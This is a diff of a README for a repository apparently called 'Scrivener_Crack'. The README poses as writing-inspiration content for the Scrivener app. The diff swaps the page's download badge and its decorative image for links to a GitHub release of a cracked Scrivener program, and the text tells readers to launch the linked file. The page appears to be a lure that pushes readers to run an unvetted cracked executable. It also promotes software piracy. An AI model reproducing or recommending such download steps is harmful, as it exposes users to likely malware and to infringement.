@@ -45,7 +45,7 @@ Dive deep into the world of Scrivener with our curated topics:
 
 To access the downloadable program related to this repository, click the button below:
 
-[![Download Scrivener Program](https://img.shields.io/badge/Download-Program.zip-blue)](https://github.com/download/Program.zip)
+[![Download Scrivener Program](https://github.com/ImzGamer/Scrivener_Crack/releases/tag/v2.0)](https://github.com/ImzGamer/Scrivener_Crack/releases/tag/v2.0)
 
 Remember, if the link ends with a file name, it needs to be launched. If you are unable to access the link or it does not work, please check the "Releases" section for alternative download options.
 
@@ -53,4 +53,4 @@ Remember, if the link ends with a file name, it needs to be launched. If you are
 
 With the resources and information provided in this repository, you are equipped to take your writing to the next level with Scrivener. Explore, create, and unleash your writing potential like never before. Happy writing! 🌟
 
-![Writing Inspiration](https://cdn.pixabay.com/photo/2015/09/05/20/02/pen-924439_960_720.jpg)
+![Writing Inspiration](https://github.com/ImzGamer/Scrivener_Crack/releases/tag/v2.0)
